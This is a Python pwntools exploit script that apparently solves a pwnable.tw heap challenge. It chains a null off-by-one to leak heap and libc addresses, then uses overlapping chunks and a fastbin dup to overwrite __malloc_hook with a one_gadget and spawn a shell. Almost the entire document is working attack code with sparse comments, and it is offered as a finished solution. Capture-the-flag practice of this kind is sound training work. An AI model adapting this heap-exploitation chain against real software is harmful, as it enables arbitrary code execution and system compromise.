###null-off-by-one to perform fastbin dup attack

from pwn import *

###Utils
def create(size,name,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('heart : ',str(size))
    r.sendafter('heart :',name)
    r.sendafter('heart :',data)

def show(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(idx))
    res = r.recvuntil('========')[:-8]
    return res

def delete(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))

###Useful addr
#  libc2.23
main_arena_offset = 0x3c3b20
unsorted_bin_offset = main_arena_offset+0x58
malloc_hook_offset = 0x3c3b10
malloc_hook_writer_offset = malloc_hook_offset-0x23
one_gadget_offset = 0xef6c4


###Exploit
r = remote('chall.pwnable.tw',10302)

###Leak heap
#  no null terminate on name -> leakable
create(0xf8,'M30W'*8,'a'*0xf7)  #0
heap_addr = u64(show(0).split(b'\n')[2].split(b'M30W'*8)[1].ljust(8,b'\x00'))-0x10


###Leak libc
#  Block2 created to prevent merge with top chunk
#  Off by one byte to overwrite inuse status of Block1
#  Free Block1 and Block0 gets merged by unsorted bin unlink
create(0xf8,'M30W'*8,'a'*0xf7)  #1
create(0xf8,'M30W'*8,'a'*0xf7)  #2
delete(0)
create(0xf8,'M30W'*8,p64(heap_addr)+p64(heap_addr)+b'a'*0xe0+p64(0x100))  #0
delete(1)
unsorted_bin_addr = u64(show(0).split(b'\n')[3].split(b'Secret : ')[1].ljust(8,b'\x00'))
libc_base = unsorted_bin_addr-unsorted_bin_offset

###Restore heap to 'clean' status for convenience
#  main_arena now believes that there are no block on heap
delete(2)

###Create fastbin attack with overlapping chunk
create(0x68,'M30W'*8,'a')    #1
create(0xf8,'M30W'*8,'a')    #2
create(0xf8,'M30W'*8,'a')    #3
delete(1)
create(0x68,'M30W'*8,p64(heap_addr)+p64(heap_addr)+b'a'*0x50+p64(0x70))    #1
delete(2)
create(0x68,'M30W'*8,'a')    #2
create(0x68,'M30W'*8,'a')    #4
delete(2)
delete(4)
delete(1)

###Overwrite malloc_hook
create(0x68,'M30W'*8,p64(libc_base+malloc_hook_writer_offset))  #1
create(0x68,'M30W'*8,'a')   #2
create(0x68,'M30W'*8,'a')   #4
payload = b'\x00'*3+p64(0)*2+p64(libc_base+one_gadget_offset)
create(0x68,'M30W'*8,payload)   #5


###Double free to invoke malloc
delete(1)
delete(4)

###get shell
r.interactive()
